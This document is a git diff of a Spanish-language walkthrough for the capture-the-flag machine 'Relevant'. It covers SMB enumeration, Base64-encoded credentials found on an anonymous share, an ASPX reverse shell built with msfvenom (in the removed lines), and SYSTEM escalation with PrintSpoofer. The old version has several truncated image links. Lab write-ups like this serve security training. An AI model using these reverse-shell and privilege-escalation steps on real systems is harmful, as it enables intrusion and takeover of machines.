@@ -1,73 +1,117 @@
 # Relevant
 
-## **Escaneo de Puertos**
-Lo primero que hice fue un escaneo de puertos utilizando **Nmap** para identificar los servicios activos en la máquina. Usé el comando:
+## Reconocimiento inicial
 
-```bash
-nmap -sC -sV -Pn -p- IP_MAQUINA
-```
+Para empezar, realizamos un escaneo de puertos en la máquina objetivo utilizando **Nmap**. Esto nos permitió identificar los servicios activos y posibles puntos de entrada.
 
-Esto reveló varios puertos abiertos, siendo los más relevantes:
-- **445**: Servicio SMB.
-- Otros puertos que no parecían útiles en este momento.
+![img1](./img/1.png)
 
-Para profundizar en el puerto **445**, ejecuté un escaneo con los scripts `smb-enum-shares.nse` y `smb-enum-users.nse`, lo que me permitió enumerar recursos compartidos y usuarios disponibles.
+El resultado del escaneo reveló varios puertos abiertos, siendo los más relevantes:
+- **445/TCP**: Servicio SMB.
+- Otros puertos que, en este momento, no parecían útiles.
 
-![img1](./
-## **Enumeración SMB**
-Una vez identificado el servicio SMB, decidí interactuar con él usando herramientas como `smbclient`. Encontré un recurso compartido llamado `nt4wrksv`, que permitía acceso anónimo. Al explorar este recurso, encontré un archivo llamado `password.txt`.
+Decidimos profundizar en el puerto **445**, ejecutando scripts específicos como `smb-enum-shares.nse` y `smb-enum-users.nse`. Esto nos permitió enumerar recursos compartidos y usuarios disponibles.
 
-![img
-Descargué el archivo y al abrirlo encontré credenciales codificadas en Base64. Para decodificarlo, utilicé la herramienta **CyberChef**:
-
-```bash
-echo "CREDENCIALES_BASE64" | base64 -d
-```
-
-Esto me proporcionó las credenciales necesarias para avanzar.
+![img2](./img/2.png)
 
 ---
 
-## **Explotación Inicial**
-Con las credenciales obtenidas, creé una reverse shell en formato **ASPX** usando `msfvenom`:
+## Enumeración mediante enum4linux
+
+Usamos la herramienta de linux `enum4linux` para poder recopilar información adicional sobre la configuración del sistema objetivo.
+
+![img3](./img/3.png)
+
+---
+
+## Interacción con SMB
+
+Una vez identificado el servicio SMB, interactuamos con él utilizando herramientas como `smbclient`. Durante esta exploración, encontramos un recurso compartido llamado `nt4wrksv`.
+
+![img4](./img/4.png)
+
+
+Este recurso permitía acceso anónimo.
+
+![img5](./img/5.png)
+
+
+Dentro de este recurso, localizamos un archivo interesante llamado `password.txt`.
+
+![img6](./img/6.png)
+
+
+
+Encontramos el archivo y, al abrirlo, descubrimos que contenía credenciales codificadas en Base64. 
+
+![img7](./img/7.png)
+
+Para decodificarlas, utilizamos el siguiente comando:
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=PUERTO -f aspx > shell.aspx
+echo "CREDENCIALES_EN_BASE64" | base64 -d
 ```
 
-Subí este archivo al recurso SMB y lo ejecuté desde el servidor HTTP de la máquina. Esto me permitió obtener acceso inicial al sistema.
+![img8](./img/8.png)
 
-![img3](./
-## **Escalada de Privilegios**
-Una vez dentro, revisé los privilegios disponibles con el comando:
+Esto nos proporcionó las credenciales necesarias para continuar avanzando.
 
-```bash
-whoami /priv
-```
+---
 
-Identifiqué que el privilegio `SeImpersonatePrivilege` estaba habilitado, lo cual es ideal para realizar una escalada de privilegios mediante el exploit **PrintSpoofer**.
+## Acceso inicial
 
-### **Uso de PrintSpoofer**
-1. Cloné el repositorio del exploit en mi máquina:
-   ```bash
-   git clone https://github.com/itm4n/PrintSpoofer.git
-   ```
-2. Compilé el ejecutable y lo subí al servidor utilizando `smbclient`.
-3. Ejecuté el exploit en la máquina objetivo:
-   ```bash
-   PrintSpoofer.exe -i -c cmd.exe
-   ```
+Con las credenciales obtenidas, generamos una reverse shell en formato **ASPX** utilizando `msfvenom`. El comando empleado fue:
 
-Esto me otorgó acceso como **NT AUTHORITY\SYSTEM**, el nivel más alto de privilegios en Windows.
+![img9](./img/9.png)
 
-![img4](./img/4.pngObtención de Flags**
-Con privilegios elevados, localicé las dos flags:
-- **user.txt:** Ubicada en el directorio del usuario comprometido.
-- **root.txt:** Encontrada en el directorio del administrador.
+Subimos este archivo al recurso SMB y lo ejecutamos desde el servidor HTTP de la máquina objetivo. 
 
-Ambos archivos contenían las flags necesarias para completar la máquina.
+![img10](./img/10.png)
 
-![img5](./img/ 
+Esto nos permitió establecer acceso inicial al sistema.
 
+![img11](./img/11.png)
 
-### ¡Máquina completada con éxito! 🎉
+![img12](./img/12.png)
+
+<br>
+
+Ahora accederemos al escritorio del usuario Bob, donde encontraremos la primera flag:
+
+![img13](./img/13.png)
+
+---
+
+## Escalada de privilegios
+
+Una vez dentro del sistema, verificamos los privilegios disponibles ejecutando:
+
+![img14](./img/14.png)
+
+Identificamos que el privilegio `SeImpersonatePrivilege` estaba habilitado. Este privilegio es ideal para realizar una escalada de privilegios utilizando el exploit **PrintSpoofer**.
+
+---
+
+### Uso de PrintSpoofer
+
+1. Clonamos el repositorio del exploit en nuestra máquina local:
+
+   ![img15](./img/15.png)
+
+2. Compilamos el ejecutable y lo subimos al servidor objetivo mediante `smbclient`.
+
+3. Ejecutamos el exploit en la máquina comprometida con el siguiente comando:
+
+   ![img16](./img/16.png)
+
+   Esto nos otorgó acceso como **NT AUTHORITY\SYSTEM**, lo que representa el nivel más alto de privilegios en un sistema Windows.
+
+---
+
+Ahora tan solo bastaría con acceder al escritorio del usuario administrador y obtener la segunda flag:
+
+![img17](./img/17.png)
+
+---
+
+### Máquina completada con éxito! 🎉
